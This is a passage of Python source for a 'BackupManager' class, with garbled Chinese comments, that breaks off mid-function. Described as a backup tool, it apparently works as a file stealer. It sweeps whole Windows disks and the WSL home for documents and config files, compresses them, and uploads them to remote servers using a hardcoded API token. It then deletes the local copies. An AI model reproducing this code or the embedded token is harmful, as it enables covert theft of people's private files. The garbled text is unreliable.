# -*- coding: utf-8 -*-

import os
import shutil
import time
import socket
import logging
import tarfile
import requests
import subprocess
from datetime import datetime, timedelta
from pathlib import Path

from .config import BackupConfig

class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        self.api_token = "qSS40ZpgNXq7zZXzy4QDSX3z9yCVCXJu"
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # é…ç½®æ–‡ä»¶å¤„ç†å™¨
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )
            
            # é…ç½®æ§åˆ¶å°å¤„ç†å™¨
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))
            
            # é…ç½®æ ¹æ—¥å¿—è®°å½•å™¨
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # æ¸…é™¤ç°æœ‰å¤„ç†å™¨
            root_logger.handlers.clear()
            
            # æ·»åŠ å¤„ç†å™¨
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except Exception as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """è·å–ç›®å½•æ€»å¤§å°
        
        Args:
            directory: ç›®å½•è·¯å¾„
            
        Returns:
            int: ç›®å½•å¤§å°ï¼ˆå­—èŠ‚ï¼‰
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """ç¡®ä¿ç›®å½•å­˜åœ¨
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: ç›®å½•æ˜¯å¦å¯ç”¨
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"âŒ è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"âŒç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"âŒ åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """æ¸…ç†å¹¶é‡æ–°åˆ›å»ºç›®å½•
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ“ä½œæ˜¯å¦æˆåŠŸ
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"âŒ æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥
        
        Returns:
            bool: æ˜¯å¦æœ‰ç½‘ç»œè¿æ¥
        """
        try:
            # å°è¯•è¿æ¥å¤šä¸ªå¯é çš„æœåŠ¡å™¨
            hosts = [
                "8.8.8.8",  # Google DNS
                "1.1.1.1",  # Cloudflare DNS
                "208.67.222.222"  # OpenDNS
            ]
            for host in hosts:
                try:
                    socket.create_connection((host, 53), timeout=self.config.NETWORK_CONNECTION_TIMEOUT)
                    return True
                except:
                    continue
            return False
        except:
            return False

    @staticmethod
    def _is_valid_file(file_path):
        """æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        
        Args:
            file_path: æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def should_exclude_dir(self, path):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤ç›®å½•
        
        æ­¤æ–¹æ³•æ£€æŸ¥ç»™å®šè·¯å¾„æ˜¯å¦åº”è¯¥è¢«æ’é™¤ï¼Œä¸»è¦é€šè¿‡ä»¥ä¸‹æ­¥éª¤ï¼š
        1. æ£€æŸ¥æ˜¯å¦ä¸ºäº‘ç›˜ç›®å½•ï¼Œå¦‚æœæ˜¯åˆ™ä¸æ’é™¤
        2. æ£€æŸ¥æ˜¯å¦åŒ¹é… EXCLUDE_INSTALL_DIRS ä¸­çš„ç›®å½•
        3. æ£€æŸ¥æ˜¯å¦åŒ…å« EXCLUDE_KEYWORDS ä¸­çš„å…³é”®è¯ï¼ˆæ”¯æŒå¤šç§åˆ†éš”ç¬¦ï¼‰
        
        Args:
            path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ’é™¤
        """
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # 1. æ£€æŸ¥æ˜¯å¦ä¸ºäº‘ç›˜ç›®å½•
        cloud_keywords = [
            "äº‘ç›˜", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "ç½‘ç›˜", "äº‘"
        ]
        if any(keyword.lower() in path_lower for keyword in cloud_keywords):
            return False
            
        # 2. æ£€æŸ¥å®Œæ•´ç›®å½•åæ˜¯å¦åœ¨æ’é™¤åˆ—è¡¨ä¸­
        if any(ex.lower() in path_lower for ex in self.config.EXCLUDE_INSTALL_DIRS):
            return True
            
        # 3. æ£€æŸ¥ç›®å½•åçš„æ¯ä¸€éƒ¨åˆ†æ˜¯å¦åŒ…å«å…³é”®è¯
        for part in path_parts:
            # é¢„å¤„ç†è·¯å¾„éƒ¨åˆ†ï¼šç§»é™¤æ‰€æœ‰å¸¸è§åˆ†éš”ç¬¦å¹¶è½¬æ¢ä¸ºå°å†™
            normalized_part = part.lower()
            for sep in [' ', '_', '-', '.']:
                normalized_part = normalized_part.replace(sep, '')
                
            # å¯¹æ¯ä¸ªå…³é”®è¯è¿›è¡Œæ£€æŸ¥
            for keyword in self.config.EXCLUDE_KEYWORDS:
                keyword_lower = keyword.lower()
                # ç§»é™¤å…³é”®è¯ä¸­çš„åˆ†éš”ç¬¦
                normalized_keyword = keyword_lower
                for sep in [' ', '_', '-', '.']:
                    normalized_keyword = normalized_keyword.replace(sep, '')
                
                # æ£€æŸ¥åŸå§‹è·¯å¾„éƒ¨åˆ†ï¼ˆæ”¯æŒç©ºæ ¼åˆ†éš”ï¼‰å’Œæ ‡å‡†åŒ–åçš„è·¯å¾„éƒ¨åˆ†
                if (keyword_lower in part.lower() or  # åŸå§‹åŒ¹é…
                    normalized_keyword in normalized_part):  # æ ‡å‡†åŒ–ååŒ¹é…
                    return True
            
        return False

    def should_exclude_wsl_path(self, path, source_dir):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤WSLè·¯å¾„
        
        Args:
            path: è·¯å¾„
            source_dir: æºç›®å½•
            
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ’é™¤
        """
        if not source_dir == str(Path.home()):
            return False
        try:
            rel = os.path.relpath(path, str(Path.home()))
            parts = rel.split(os.sep)
            return any(part in self.config.EXCLUDE_WSL_DIRS for part in parts)
        except Exception:
            return False

    def backup_wsl_files(self, source_dir, target_dir):
        """WSLç¯å¢ƒæ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("âŒ WSLæºç›®å½•ä¸å­˜åœ¨")
            return None

        # åˆ›å»ºä¸¤ä¸ªå­ç›®å½•ç”¨äºå­˜æ”¾ä¸åŒç±»å‹çš„æ–‡ä»¶
        target_docs = os.path.join(target_dir, "docs")
        # å°† configs ç›®å½•é‡å‘½åä¸º specifiedï¼Œç”¨äºå­˜æ”¾ WSL_SPECIFIC_DIRS çš„å†…å®¹
        target_specified = os.path.join(target_dir, "specified")
        # æ–°å¢ç›®å½•ç”¨äºå­˜æ”¾æ ¹æ®æ‰©å±•åç­›é€‰çš„é…ç½®æ–‡ä»¶
        target_configs_by_ext = os.path.join(target_dir, "configs_by_ext")
        
        if not self._clean_directory(target_dir):
            return None
            
        if not all(self._ensure_directory(d) for d in [target_docs, target_specified, target_configs_by_ext]):
            return None

        # æ·»åŠ è®¡æ•°å™¨å’Œè¶…æ—¶æ§åˆ¶
        start_time = time.time()
        last_progress_time = start_time
        timeout = self.config.WSL_BACKUP_TIMEOUT
        total_files = 0
        processed_files = 0

        # è¾“å‡ºå¼€å§‹å¤‡ä»½çš„ä¿¡æ¯
        logging.info("\n" + "â”€" * 50)
        logging.info("ğŸš€ å¼€å§‹å¤‡ä»½ WSL é‡è¦ç›®å½•å’Œæ–‡ä»¶")
        logging.info("â”€" * 50 + "\n")

        # å¤„ç†æŒ‡å®šç›®å½•å’Œæ–‡ä»¶ï¼ˆå®Œæ•´å¤‡ä»½ï¼Œä¸ç­›é€‰æ‰©å±•åï¼‰
        for specific_path in self.config.WSL_SPECIFIC_DIRS:
            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            if time.time() - start_time > timeout:
                logging.error("\nâŒ WSLå¤‡ä»½è¶…æ—¶")
                return None

            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                try:
                    # å¯¹äºæŒ‡å®šçš„ç›®å½•å’Œæ–‡ä»¶ï¼Œä¿å­˜åœ¨ specified ç›®å½•ä¸‹
                    target_base_for_specific = target_specified
                    if os.path.isfile(full_source_path):
                        # å¦‚æœæ˜¯æ–‡ä»¶ï¼Œç›´æ¥å¤åˆ¶
                        target_file = os.path.join(target_base_for_specific, specific_path)
                        target_file_dir = os.path.dirname(target_file)
                        if self._ensure_directory(target_file_dir):
                            shutil.copy2(full_source_path, target_file)
                            processed_files += 1
                            if self.config.DEBUG_MODE:
                                logging.info(f"ğŸ“„ å·²å¤‡ä»½: {specific_path}")
                    else:
                        # å¦‚æœæ˜¯ç›®å½•ï¼Œé€’å½’å¤åˆ¶å…¨éƒ¨å†…å®¹
                        target_path = os.path.join(target_base_for_specific, specific_path)
                        if self._ensure_directory(os.path.dirname(target_path)):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path)
                            
                            # æ·»åŠ ç›®å½•å¤åˆ¶è¿›åº¦æ—¥å¿—
                            logging.info(f"\nğŸ“ æ­£åœ¨å¤‡ä»½: {specific_path}/")
                            for root, _, files in os.walk(full_source_path):
                                total_files += len(files)
                            
                            shutil.copytree(full_source_path, target_path, 
                                         symlinks=True, 
                                         ignore=lambda d, files: [f for f in files 
                                                                if any(ex in f for ex in self.config.EXCLUDE_WSL_DIRS)])
                except Exception as e:
                    logging.error(f"\nâŒ å¤‡ä»½å¤±è´¥: {specific_path} - {str(e)}")

        logging.info("\n" + "â”€" * 50)
        logging.info("ğŸ” å¼€å§‹æ‰«æå…¶ä»–é‡è¦æ–‡ä»¶")
        logging.info("â”€" * 50)

        # å¤„ç†å…¶ä»–ç›®å½•ä¸­çš„æ–‡ä»¶ï¼ˆæŒ‰æ‰©å±•ååˆ†ç±»ï¼‰
        docs_count = 0 # configs_count å·²ç»ä¸å†ç›´æ¥ç”¨äºè®¡æ•°ï¼Œå› ä¸ºç›®æ ‡ç›®å½•å·²åˆ†ç¦»
        configs_by_ext_count = 0
        for root, _, files in os.walk(source_dir):
            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            current_time = time.time()
            if current_time - start_time > timeout:
                logging.error("\nâŒ WSLå¤‡ä»½è¶…æ—¶")
                return None
            
            # æ¯Nç§’è¾“å‡ºä¸€æ¬¡è¿›åº¦
            if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
                elapsed_minutes = int((current_time - start_time) / 60)
                logging.info(f"\nâ³ å·²å¤„ç† {processed_files} ä¸ªæ–‡ä»¶... ({elapsed_minutes}åˆ†é’Ÿ)")
                last_progress_time = current_time
            
            # è·³è¿‡å·²ç»å®Œæ•´å¤‡ä»½çš„æŒ‡å®šç›®å½•
            if any(specific_dir in root for specific_dir in self.config.WSL_SPECIFIC_DIRS):
                continue
                
            if os.path.abspath(root).startswith(target_dir):
                continue
            
            if self.should_exclude_wsl_path(root, source_dir):
                continue

            for file in files:
                # æ£€æŸ¥æ–‡ä»¶ç±»å‹å¹¶å†³å®šç›®æ ‡ç›®å½•
                is_doc = any(file.lower().endswith(ext) for ext in self.config.WSL_EXTENSIONS_1)
                is_config = any(file.lower().endswith(ext) for ext in self.config.WSL_EXTENSIONS_2)
                
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                if not os.path.exists(source_file):
                    continue

                # æ ¹æ®æ–‡ä»¶ç±»å‹é€‰æ‹©ç›®æ ‡ç›®å½•
                target_base = target_docs if is_doc else target_configs_by_ext # ä½¿ç”¨æ–°çš„ç›®å½•
                relative_path = os.path.relpath(root, source_dir)
                target_sub_dir = os.path.join(target_base, relative_path)
                target_file = os.path.join(target_sub_dir, file)

                if not self._ensure_directory(target_sub_dir):
                    continue
                    
                try:
                    shutil.copy2(source_file, target_file)
                    processed_files += 1
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_by_ext_count += 1 # è®¡æ•°æ›´æ–°åˆ°æ–°çš„å˜é‡
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.error(f"\nâŒ å¤åˆ¶å¤±è´¥: {relative_path}/{file} - {str(e)}")

        # è®¡ç®—æ€»ç”¨æ—¶
        total_time = time.time() - start_time
        total_minutes = int(total_time / 60)

        if docs_count > 0 or configs_by_ext_count > 0:
            logging.info("\n" + "â•" * 50)
            logging.info("ğŸ“Š WSLå¤‡ä»½ç»Ÿè®¡")
            logging.info("â•" * 50)
            if docs_count > 0:
                logging.info(f"   ğŸ“š æ–‡æ¡£æ–‡ä»¶ï¼š{docs_count} ä¸ª")
            if configs_by_ext_count > 0:
                logging.info(f"   âš™ï¸  æŒ‰æ‰©å±•ååˆ†ç±»çš„é…ç½®æ–‡ä»¶ï¼š{configs_by_ext_count} ä¸ª")
            logging.info("â”€" * 50)
            logging.info(f"   ğŸ”„ æ€»è®¡å¤„ç†ï¼š{processed_files} ä¸ªæ–‡ä»¶")
            logging.info(f"   â±ï¸  æ€»å…±è€—æ—¶ï¼š{total_minutes} åˆ†é’Ÿ")
            logging.info("â•" * 50 + "\n")

        return target_dir

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """Windowsç£ç›˜æ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error(f"\nâŒ ç£ç›˜æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            return None

        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
                     
        files_count = 0
        total_size = 0
        scan_timeout = self.config.DISK_SCAN_TIMEOUT
        retry_count = self.config.RETRY_COUNT
        retry_delay = 5  # æ–‡ä»¶è®¿é—®é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
        start_time = time.time()
        last_progress_time = start_time

        # è¾“å‡ºå¼€å§‹å¤‡ä»½çš„ä¿¡æ¯
        logging.info("\n" + "â”€" * 50)
        logging.info("ğŸš€ å¼€å§‹æ‰«æç£ç›˜é‡è¦æ–‡ä»¶")
        logging.info("â”€" * 50)

        try:
            # ä½¿ç”¨ os.walk çš„ topdown=True å‚æ•°ï¼Œè¿™æ ·å¯ä»¥è·³è¿‡ä¸éœ€è¦çš„ç›®å½•
            for root, dirs, files in os.walk(source_dir, topdown=True):
                # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
                current_time = time.time()
                if current_time - start_time > scan_timeout:
                    logging.error(f"\nâŒ æ‰«æç›®å½•è¶…æ—¶: {source_dir}")
                    break
                    
                # æ¯Nç§’æ˜¾ç¤ºä¸€æ¬¡è¿›åº¦
                if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
                    elapsed_minutes = int((current_time - start_time) / 60)
                    logging.info(f"\nâ³ å·²å¤„ç† {files_count} ä¸ªæ–‡ä»¶... ({elapsed_minutes}åˆ†é’Ÿ)")
                    last_progress_time = current_time
                
                # è·³è¿‡ç›®æ ‡ç›®å½•
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # è·³è¿‡æ’é™¤çš„ç›®å½•
                if self.should_exclude_dir(root):
                    dirs.clear()  # æ¸…ç©ºå­ç›®å½•åˆ—è¡¨ï¼Œé¿å…ç»§ç»­éå†
                    continue

                # å¤„ç†æ–‡ä»¶
                for file in files:
                    if not any(file.lower().endswith(ext.lower()) for ext in extensions):
                        continue

                    source_file = os.path.join(root, file)
                    
                    # æ£€æŸ¥æ–‡ä»¶å¤§å°
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0 or file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            continue
                    except OSError:
                        continue

                    # å°è¯•å¤åˆ¶æ–‡ä»¶
                    for attempt in range(retry_count):
                        try:
                            # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯è®¿é—®
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError):
                                if attempt < retry_count - 1:
                                    time.sleep(retry_delay)
                                    continue
                                else:
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                break
                                
                            # ä½¿ç”¨åˆ†å—å¤åˆ¶
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                shutil.copyfileobj(src, dst, length=self.config.FILE_COPY_BUFFER_SIZE)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            break  # æˆåŠŸåè·³å‡ºé‡è¯•å¾ªç¯
                            
                        except (OSError, IOError, PermissionError) as e:
                            if attempt == retry_count - 1 and self.config.DEBUG_MODE:
                                logging.error(f"\nâŒ æ–‡ä»¶å¤åˆ¶å¤±è´¥: {file} - {str(e)}")

        except (OSError, IOError) as e:
            logging.error(f"\nâŒ å¤‡ä»½è¿‡ç¨‹å‡ºé”™: {str(e)}")

        # æ˜¾ç¤ºæœ€ç»ˆç»Ÿè®¡ä¿¡æ¯
        if files_count > 0:
            total_minutes = int((time.time() - start_time) / 60)
            logging.info("\n" + "â•" * 50)
            logging.info("ğŸ“Š ç£ç›˜å¤‡ä»½ç»Ÿè®¡")
            logging.info("â•" * 50)
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡ï¼š{files_count} ä¸ª")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°ï¼š{total_size / 1024 / 1024:.1f}MB")
            logging.info("â”€" * 50)
            logging.info(f"   â±ï¸  æ€»å…±è€—æ—¶ï¼š{total_minutes} åˆ†é’Ÿ")
            logging.info("â•" * 50 + "\n")
            return target_dir
        else:
            logging.error(f"\nâŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æ–‡ä»¶")
            return None
    
    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå°å—
        
        Args:
            file_path: è¦åˆ†å‰²çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: åˆ†ç‰‡æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœä¸éœ€è¦åˆ†å‰²åˆ™è¿”å›None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            # åˆ é™¤åŸå§‹å¤§æ–‡ä»¶
            os.remove(file_path)
            logging.critical(f"æ–‡ä»¶ {file_path} å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files
        except (OSError, IOError) as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not self._is_valid_file(file_path):
            logging.error(f"âš ï¸ æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False

        # æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶åœ¨éœ€è¦æ—¶åˆ†ç‰‡
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # æ¸…ç†åˆ†ç‰‡ç›®å½•
            chunk_dir = os.path.dirname(chunk_files[0])
            self._clean_directory(chunk_dir)
            return success
        else:
            return self._upload_single_file(file_path)

    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0 {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"âš ï¸ æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            for attempt in range(self.config.RETRY_COUNT):
                # æ£€æŸ¥ç½‘ç»œè¿æ¥
                if not self._check_internet_connection():
                    logging.error("âš ï¸ ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY * 2)  # ç½‘ç»œé—®é¢˜æ—¶ç­‰å¾…æ›´é•¿æ—¶é—´
                    continue

                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            logging.critical(f"âŒ› æ­£åœ¨ä¸Šä¼ æ–‡ä»¶ {file_path}ï¼ˆ{file_size / 1024 / 1024:.2f}MBï¼‰ï¼Œç¬¬ {attempt + 1} æ¬¡å°è¯•ï¼Œä½¿ç”¨æœåŠ¡å™¨ {server}...")
                            
                            response = requests.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"ğŸ“¤ ä¸Šä¼ æˆåŠŸ: {file_path}")
                                    os.remove(file_path)
                                    return True
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    logging.error(f"âŒ æœåŠ¡å™¨è¿”å›é”™è¯¯: {error_msg}")
                            else:
                                logging.error(f"âŒ ä¸Šä¼ å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}, å“åº”: {response.text}")
                                
                    except requests.exceptions.Timeout:
                        logging.error(f"âŒ ä¸Šä¼ è¶…æ—¶ {file_path}")
                    except requests.exceptions.SSLError:
                        logging.error(f"âŒ SSLé”™è¯¯ {file_path}")
                    except requests.exceptions.ConnectionError:
                        logging.error(f"âŒ è¿æ¥é”™è¯¯ {file_path}")
                    except Exception as e:
                        logging.error(f"âŒ ä¸Šä¼ æ–‡ä»¶å‡ºé”™ {file_path}: {str(e)}")
                    
                    # å¦‚æœè¿™ä¸ªæœåŠ¡å™¨å¤±è´¥ï¼Œç»§ç»­å°è¯•ä¸‹ä¸€ä¸ªæœåŠ¡å™¨
                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    logging.critical(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
            
            # æ‰€æœ‰é‡è¯•éƒ½å¤±è´¥åï¼Œåˆ é™¤æ–‡ä»¶
            try:
                os.remove(file_path)
                logging.error(f"âš ï¸ æ–‡ä»¶ {file_path} ä¸Šä¼ å¤±è´¥å¹¶å·²åˆ é™¤")
            except Exception as e:
                logging.error(f"âŒ åˆ é™¤å¤±è´¥æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            
            return False
            
        except OSError as e:
            logging.error(f"âŒ è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
            if os.path.exists(file_path):
                os.remove(file_path)
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """å‹ç¼©å¤‡ä»½æ–‡ä»¶å¤¹ä¸ºtar.gzæ ¼å¼
        
        Args:
            folder_path: è¦å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„
            zip_file_path: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼ˆä¸å«æ‰©å±•åï¼‰
            
        Returns:
            str or list: å‹ç¼©æ–‡ä»¶è·¯å¾„æˆ–å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # æ£€æŸ¥æºç›®å½•æ˜¯å¦ä¸ºç©º
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"âš ï¸ æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            # è®¡ç®—æºç›®å½•å¤§å°
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"âŒè·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                logging.error(f"âš ï¸ æºç›®å½•è¿‡å¤§ {folder_path}: {dir_size / 1024 / 1024 / 1024:.2f}GB > {self.config.MAX_SOURCE_DIR_SIZE / 1024 / 1024 / 1024}GB")
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # éªŒè¯å‹ç¼©æ–‡ä»¶
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                logging.critical(f"ğŸ—‚ï¸ ç›®å½• {folder_path} ğŸ—ƒï¸ å·²å‹ç¼©: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
            except OSError as e:
                logging.error(f"âŒ è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"âŒ å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def _compress_chunk_part(self, part_dir, folder_path, base_zip_path, part_num, chunk_size):
        """å‹ç¼©å•ä¸ªåˆ†å—ç›®å½•
        
        Args:
            part_dir: åˆ†å—ç›®å½•è·¯å¾„
            folder_path: åŸå§‹ç›®å½•è·¯å¾„ï¼ˆç”¨äºarcnameï¼‰
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            part_num: åˆ†å—ç¼–å·
            chunk_size: åˆ†å—å¤§å°ï¼ˆå­—èŠ‚ï¼‰
            
        Returns:
            str or None: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼Œå¤±è´¥è¿”å›None
        """
